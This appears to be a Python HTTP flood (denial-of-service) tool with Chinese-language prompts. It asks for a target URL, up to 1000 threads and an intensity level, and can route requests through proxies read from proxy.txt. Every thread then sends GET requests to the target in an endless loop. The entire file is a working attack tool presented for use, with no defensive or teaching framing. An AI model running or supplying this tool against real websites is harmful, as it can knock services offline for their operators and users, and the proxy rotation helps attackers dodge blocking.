import socket
import socks
import threading
import random
import re
import urllib.request
import os
import sys
from bs4 import BeautifulSoup
import time
import logging
from yaspin import yaspin
from ytlv import *
import requests


print('''
      ___           ___           ___           ___     
     /\__\         /\  \         /\__\         /\  \    
    /::|  |       /::\  \       /:/  /        /::\  \   
   /:|:|  |      /:/\:\  \     /:/__/        /:/\:\  \  
  /:/|:|  |__   /::\~\:\  \   /::\__\____   /:/  \:\  \ 
 /:/ |:| /\__\ /:/\:\ \:\__\ /:/\:::::\__\ /:/__/ \:\__\
 \/__|:|/:/  / \:\~\:\ \/__/ \/_|:|~~|~    \:\  \ /:/  /
     |:/:/  /   \:\ \:\__\      |:|  |      \:\  /:/  / 
     |::/  /     \:\ \/__/      |:|  |       \:\/:/  /  
     /:/  /       \:\__\        |:|  |        \::/  /   
     \/__/         \/__/         \|__|         \/__/    


     c0|}3 by 白雲天狗
     ''')



def start():
    global url
    global isproxy
    global whatthreads
    global power
    url=input("請輸入url:")

    if url == "":
        print("請不要啥都不看就按下Enter")
        start()

    isproxy=input("你想要使用proxy server嗎? 請輸入(y,n)")
    if isproxy=="y":
        isproxy=True
    else:
        isproxy=False
    
    try:        
        whatthreads=int(input("請問想要啟用多少線程?(最多1000)"))
    except:
        print("輸入錯誤 設定100")
        whatthreads=100
    try:
        power=int(input("請輸入強度(最小1，最大100 當然也是可以超過:P)"))
    except:
        print("輸入錯誤 強度設定 50")
        power=50
    go()



def go():
    global whatthreads
    global neko
    global x
    x=0
    neko = threading.Event()
    with yaspin(text="加載配置中", color="yellow") as spinner:
        if isproxy==True:
            lv=islive()
            lv.lvgetproxy()
            for x in range(whatthreads):
                proxyserver(x+1).start()
                #print(f"server{x}準備完成")
            neko.set()

        else:
            for x in range(whatthreads):
                deerver(x+1).start()
                #print(f"server{x}準備完成")
            print("並未啟用proxy server 將直接啟動")
            neko.set()

        time.sleep(3)
        spinner.ok("✅ ")


class proxyserver(threading.Thread):

    def __init__(self,count):
        threading.Thread.__init__(self)
        self.count=count

    def run(self):
        path=os.getcwd()
        lines =  open(f"{path}\proxy.txt").read().splitlines()
        proxy= random.choice(lines)
        proxies = {
        'http': 'http://' + proxy        
         }

        while True:
            for i in range(power):
                r = requests.get(url,proxies=proxies)
                print("已傳送")



class deerver(threading.Thread):

    def __init__(self,count):
        threading.Thread.__init__(self,)
        self.count=count

    def run(self):


        while True:
            for i in range(power):
                r = requests.get(url)
                print("已傳送")



if __name__ == '__main__':
	start()
